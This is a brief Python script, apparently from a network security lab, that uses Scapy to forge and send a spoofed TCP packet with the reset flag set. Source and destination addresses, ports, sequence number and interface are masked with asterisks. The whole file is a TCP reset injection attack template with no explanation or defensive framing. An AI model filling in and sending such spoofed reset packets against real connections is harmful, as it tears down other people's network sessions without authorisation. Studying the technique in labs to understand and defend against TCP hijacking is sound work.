from scapy.all import *

ip =IP(src = "****", dst = "****")

tcp = TCP(sport = ****, dport = ****, flags ="R", seq = ****)

pkt = ip/tcp

ls(pkt)
send(pkt, iface = "****", verbose = 0)
